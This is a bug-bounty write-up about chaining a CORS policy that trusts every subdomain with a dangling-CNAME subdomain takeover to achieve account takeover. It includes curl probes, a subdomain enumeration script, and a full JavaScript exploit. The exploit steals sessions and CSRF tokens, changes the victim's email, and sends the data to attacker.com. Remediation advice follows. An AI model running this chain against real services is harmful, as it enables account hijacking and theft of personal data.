CORS Wildcard + Subdomain Takeover = Full Account Takeover

Inspired by Vitor Falcao's CORS exploitation research · Pattern found on Grammarly, Acorns, Indeed, DICE FM

Vulnerability

Three backend services reflect any *.target.com subdomain as Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true. Combined with dangling CNAME records pointing to claimable third-party services, an attacker can host JavaScript on a trusted subdomain and make authenticated cross-origin requests to steal all user data.

The Discovery

The researcher started with a simple CORS probe against the target's API:

curl -s -D- -o /dev/null \
  -H "Origin: https://evil.target.com" \
  "https://api.target.com/"

# Response:
access-control-allow-origin: https://evil.target.com
access-control-allow-credentials: true
access-control-allow-methods: DELETE,POST,PUT,GET,OPTIONS,HEAD,PATCH
access-control-allow-headers: Authorization,X-CSRF-Token,
  X-Authorization-SuperUser-ResourceId,X-Authorization-Passport...

The API reflects any subdomain with full credentials. But external origins like evil.com or evilgrammarly.com are correctly rejected. This means the CORS policy is:

// Server-side CORS logic (pseudocode)
if (origin.endsWith('.target.com')) {
    setHeader('Access-Control-Allow-Origin', origin);
    setHeader('Access-Control-Allow-Credentials', 'true');
}
// This trusts ALL subdomains equally - a fatal flaw

The Chain: Finding a Claimable Subdomain

CORS wildcard on subdomains is only exploitable if you can execute JavaScript on a *.target.com subdomain. The researcher enumerated 211 subdomains via certificate transparency logs and found multiple dangling CNAMEs:

# Subdomain enumeration
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u > subs.txt
# 211 subdomains found

# Check for dangling CNAMEs
while read sub; do
  cname=$(dig +short $sub CNAME)
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$sub" 2>/dev/null)
  [ "$status" = "404" ] && echo "DANGLING: $sub -> $cname ($status)"
done < subs.txt

# Results:
DANGLING: research.target.com -> pages.greatquestion.co (404)
DANGLING: experiences.target.com -> d3a2b2ll62mf1g.cloudfront.net (404)
DANGLING: data.target.com -> prod-data.acquisition.grammarlyaws.com (404)

research.target.com points to pages.greatquestion.co which returns a 404. If the attacker can claim this CNAME on GreatQuestion, they control JavaScript execution on a trusted subdomain.

The Chain

Bug 1: CORS reflects *.target.com with credentials on API, auth, and data services

Bug 2: research.target.com has a dangling CNAME to a claimable third-party service

Result: Claim the subdomain, host exploit JS, steal any authenticated user's data including auth tokens, CSRF tokens, and personal data. Full account takeover.

Exploitation

Once the attacker claims research.target.com, they host exploitation JavaScript:

<!-- Hosted on research.target.com (attacker-controlled) -->
<script>
// Step 1: Steal user data from API
fetch('https://api.target.com/user', {
  credentials: 'include'
}).then(r => r.json()).then(userData => {

  // Step 2: Steal auth tokens from auth service
  return fetch('https://auth.target.com/api/auth/session', {
    credentials: 'include'
  }).then(r => r.json()).then(authData => ({userData, authData}));

}).then(({userData, authData}) => {

  // Step 3: Read CSRF token (exposed in CORS headers!)
  return fetch('https://api.target.com/user', {
    credentials: 'include'
  }).then(r => {
    const csrf = r.headers.get('X-CSRF-Token');
    return {userData, authData, csrf};
  });

}).then(({userData, authData, csrf}) => {

  // Step 4: Change victim's email (full ATO)
  fetch('https://api.target.com/user/email', {
    method: 'PUT',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrf
    },
    body: JSON.stringify({email: 'attacker@evil.com'})
  });

  // Step 5: Exfiltrate everything
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({user: userData, auth: authData, csrf})
  });
});
</script>

Why It Matters

This pattern was found across multiple major targets. The CORS headers exposed Authorization, X-CSRF-Token, X-Authorization-SuperUser-ResourceId, and X-Authorization-Passport headers cross-origin. CORS allowed DELETE, PUT, PATCH methods with credentials. The attacker gets full read/write access to the victim's account from a trusted subdomain.

↓

The "Any Origin" Variant

An even worse pattern was found on health/fitness APIs: the server reflects any origin at all, not just subdomains. This means any website on the internet can steal user data without needing a subdomain takeover:

curl -s -D- -o /dev/null \
  -H "Origin: https://evil.com" \
  "https://api.healthapp.com/"

# Response:
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-expose-headers: *

No XSS needed. No subdomain compromise. Any website the victim visits can silently steal their health data, exercise logs, body measurements, and account credentials.

Bug Bounty Tip

Always test CORS with three payloads: (1) your exact evil domain, (2) null origin, (3) a subdomain like evil.target.com. If the API reflects subdomains with credentials, immediately enumerate subdomains for dangling CNAMEs. The CORS bug alone might be Medium, but chained with a subdomain takeover it becomes Critical. Also check what headers are exposed — Authorization and X-CSRF-Token in CORS headers is an instant escalation.

Remediation

  • Implement a strict origin allowlist — only reflect known frontend origins (e.g., https://app.target.com)
  • Never expose sensitive headers like Authorization, X-CSRF-Token, or X-Authorization-Passport via CORS
  • Restrict CORS methods per endpoint — not all methods globally
  • Remove all dangling CNAME records immediately
  • Add SameSite=Strict to auth cookies as defense-in-depth
